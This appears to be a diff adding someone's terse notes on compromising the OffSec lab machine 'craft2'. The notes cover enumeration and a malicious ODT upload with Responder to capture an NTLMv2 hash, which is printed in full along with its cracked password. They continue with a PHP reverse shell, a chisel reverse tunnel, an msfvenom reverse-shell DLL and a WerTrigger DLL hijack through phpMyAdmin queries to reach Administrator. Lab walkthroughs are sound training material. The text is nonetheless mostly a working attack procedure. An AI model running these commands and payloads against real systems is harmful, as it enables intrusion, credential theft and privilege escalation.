@@ -1,0 +1,108 @@
+craft2
+
+ 192.168.165.188
+
+sudo nmap -Pn -n 192.168.165.188 -sC -sV -p- --open 
+sudo nmap -Pn -n 192.168.165.188 -sU --top-ports=100 --reason
+
+sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://192.168.165.188:80 -t 42 -b 400,401,403,404 --no-error
+
+http://192.168.165.188/upload.php
+File is not valid. Please submit ODT file
+only odt files are allowed
+
+enum4linux 192.168.165.188
+
+smbclient -N -L \\\\192.168.165.188\\
+
+crackmapexec smb 192.168.165.188 --shares
+
+admin@craft.offsec 
+domain name craft.offsec
+
+echo "this is not importaant file remmeber" >hack.odt
+
+/Uploads              (Status: 301) [Size: 344] [--> http://192.168.165.188/Uploads/]
+
+check the uloads directory the file has been removed or stored somewhere else
+
+searchsploit odt
+searchsploit -m 44564.py
+python2 44564.py
+
+pip install ezodf
+
+I was unable to run this script so tried found newest script for same 
+
+https://github.com/rmdavy/badodf/blob/master/badodt.py
+python badodt.py
+before upload the file run responder
+
+responder -I tun0 -v
+Then upload the file lets wait for a moment
+
+Got hash
+
+thecybergeek::CRAFT2:4d129b4f6cd79ba1:26A8D7B6BCCB680785039A7F61824569:01010000000000008030F5541211DB01DA5049C8CA748AB90000000002000800380043005400350001001E00570049004E002D004D0059004500470032003100430044004A005400420004003400570049004E002D004D0059004500470032003100430044004A00540042002E0038004300540035002E004C004F00430041004C000300140038004300540035002E004C004F00430041004C000500140038004300540035002E004C004F00430041004C00070008008030F5541211DB0106000400020000000800300030000000000000000000000000300000CC0138A695F108F7A308F99F4D3F33A4267464CF03A9B699EAF3B754930C64410A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370036000000000000000000   
+
+store hashes into hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+hashcat --status -w 4 -a 0 thecybergeek::CRAFT2:52800ef242d4b979:87CA5EF1A1F306DC496B62F3DBFCE188:0101000000000000001C38C67C13DB010CD6691DCDB7346D0000000002000800480049004200570001001E00570049004E002D005100580055005100340041005900420046003100480004003400570049004E002D00510058005500510034004100590042004600310048002E0048004900420057002E004C004F00430041004C000300140048004900420057002E004C004F00430041004C000500140048004900420057002E004C004F00430041004C0007000800001C38C67C13DB0106000400020000000800300030000000000000000000000000300000CC0138A695F108F7A308F99F4D3F33A4267464CF03A9B699EAF3B754930C64410A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350032000000000000000000 /usr/share/wordlists/rockyou.txt -m 5600
+
+hashcat is faster than john
+winniethepooh
+enum4linux -a -u "CRAFT2\thecybergeek" -p "winniethepooh" 192.168.130.188
+
+WebApp          Disk  share directory
+
+smbclient \\\\192.168.165.188\\WebApp -U 'CRAFT2\thecybergeek'
+
+We landed into web root directory
+
+ulploaded shell but unable to execute
+
+PHP Ivan Sincek uploaded shell 
+
+got the shell 
+
+cp /usr/share/peass/winpeas/winPEASany.exe ./winp.exe
+put winp.exe
+.\winp.exe
+
+https://github.com/jpillora/chisel/releases
+
+chmod +x chisel_1.10.0_linux_amd64
+sudo ./chisel_1.10.0_linux_amd64 server -p 8090 --reverse
+C:\xampp\htdocs>.\chisel_1.10.0_windows_amd64 client KaliIP:8090 R:80:127.0.0.1:80
+
+in browser in Kali linux
+
+http://localhost/phpmyadmin/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#wertrigger
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=Kali IP LPORT=139 -f dll > phoneinfo.dll
+
+smb: \> put WerTrigger.exe
+putting file WerTrigger.exe as \WerTrigger.exe (14.5 kb/s) (average 14.5 kb/s)
+smb: \> put Report.wer
+putting file Report.wer as \Report.wer (3.9 kb/s) (average 7.2 kb/s)
+smb: \> put phoneinfo.dll
+putting file phoneinfo.dll as \phoneinfo.dll (26.7 kb/s) (average 8.9 kb/s)
+smb: \> 
+
+in pyhpmyadmin in kali browser
+
+select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
+select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
+select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
+
+.\wertrigger.exe
+
+Got Administrator shell
+
+
+
